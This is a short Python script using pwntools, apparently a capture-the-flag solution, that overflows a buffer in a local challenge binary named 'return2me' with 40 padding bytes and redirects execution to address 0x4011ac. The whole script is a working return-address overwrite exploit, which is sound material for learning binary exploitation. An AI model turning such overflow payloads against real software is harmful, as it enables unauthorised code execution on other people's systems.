from pwn import *

context.binary = exec = ELF("./return2me")

payload = b"A" * 40 + p64(0x4011ac)

conn = process()

conn.recvuntil(b"name?\n")
conn.sendline(payload)
rec = conn.recvall()
print(rec)